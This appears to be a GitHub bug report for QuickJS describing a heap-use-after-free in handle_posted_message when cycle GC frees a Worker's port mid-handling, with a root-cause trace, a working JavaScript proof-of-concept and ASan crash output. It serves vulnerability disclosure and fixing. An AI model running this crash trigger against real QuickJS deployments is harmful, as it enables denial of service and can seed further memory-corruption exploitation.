# heap-use-after-free in `handle_posted_message`

- URL: https://github.com/bellard/quickjs/issues/527
- Repo: bellard/quickjs (language: C)
- State: open; created 2026-06-24T08:16:55Z; status ok; passes offcwe

## Issue body

reporter (NONE) · smaeljaish771 · 2026-06-24T08:16:55Z · https://github.com/bellard/quickjs/issues/527

QuickJS can hit a heap-use-after-free in `handle_posted_message()` when a
`Worker` object is collected by cycle GC while its pending message is being
handled.

The vulnerable path is in `quickjs-libc.c`. `handle_posted_message()` receives a
`JSWorkerMessageHandler *port` from `ts->port_list`, then allocates JS objects
while preparing the message event. Those allocations may trigger GC. If the
owning `Worker` is only kept alive by a JS self-cycle, GC can finalize it and
free `port`. After GC returns, `handle_posted_message()` still reads from the
same `port` pointer:

```c
obj = JS_NewObject(ctx);                         // may trigger GC
...
func = JS_DupValue(ctx, port->on_message_func); // port may already be freed
```

This produces a UAF read in ASan builds and a reliable crash in non-ASan builds.

## Root Cause

The message handler pointer is not pinned while `handle_posted_message()` runs.
A simplified flow is:

1. `js_os_poll()` iterates `ts->port_list` and passes a `port` pointer to
   `handle_posted_message()`.
2. `handle_posted_message()` removes a pending message and calls
   `JS_ReadObject()` / `JS_NewObject()` to build the event object.
3. `JS_NewObject()` can trigger `js_trigger_gc()`.
4. Cycle GC can collect the owning `Worker` if it is only reachable through a
   self-cycle such as `w.self_ref = w; w = null;`.
5. `js_worker_finalizer()` calls `js_free_port()` and frees the same `port`.
6. Control returns to `handle_posted_message()`, which dereferences
   `port->on_message_func`.

The previous Worker freeing fix in commit `728ed94` hardened runtime shutdown
handling, but it does not protect this in-flight message handling path.

## Proof of Concept

`poc.js`

```
import * as os from 'os';

if (os.Worker.parent) {
    var largeData = [];
    for (var i = 0; i < 20000; i++) {
        largeData.push("data_item_" + i);
    }

    os.Worker.parent.postMessage(largeData);
} else {
    // Main side: run this PoC from its artifact directory so "poc.js"
    // resolves correctly when creating the Worker below.
    var workerPath = "poc.js";

    // Push malloc_size close to the GC threshold. The exact values are
    // intentionally generous so the allocation in handle_posted_message()
    // reliably triggers cycle collection on the tested builds.
    var heap_filler = [];
    for (var i = 0; i < 3000; i++) {
        heap_filler.push({a: i, b: i * 2, c: "x".repeat(10)});
    }

    // Create a Worker that will later be reachable only through a self-cycle.
    var w = new os.Worker(workerPath);
    w.self_ref = w;

    w.onmessage = function(e) {
        print("Handler called - type:", typeof e.data);
    };

    // Drop the external reference. The Worker is now collectable by cycle GC.
    w = null;

    print("Waiting for worker message...");
}

```

## Observed Results

On a non-ASan build, the PoC crashes reliably in this environment:

```text
Segmentation fault (core dumped)
exit code: 139
```

On an ASan build, it reports a heap-use-after-free:

```text
ERROR: AddressSanitizer: heap-use-after-free
READ of size 8
    #0 JS_DupValue            quickjs.h:710
    #1 handle_posted_message  quickjs-libc.c:2395
```

The free happens during the same `handle_posted_message()` call, from GC entered
while creating the event object:

```text
freed by thread T0 here:
    #1 js_free_port           quickjs-libc.c:3580
    #2 js_worker_finalizer    quickjs-libc.c:3595
    #5 gc_free_cycles         quickjs.c:6787
    #8 js_trigger_gc          quickjs.c:1794
    #9 JS_NewObjectFromShape  quickjs.c:5619
    #11 handle_posted_message quickjs-libc.c:2386
```

ASan is not required to trigger the bug; it is only used to show the first invalid access clearly.
`halt_on_error=0` is not needed. If leak reports are noisy, this is sufficient:

```bash
ASAN_OPTIONS=detect_leaks=0 /path/to/qjs poc.js
```

[asan_output.log](https://github.com/user-attachments/files/29284162/asan_output.log)

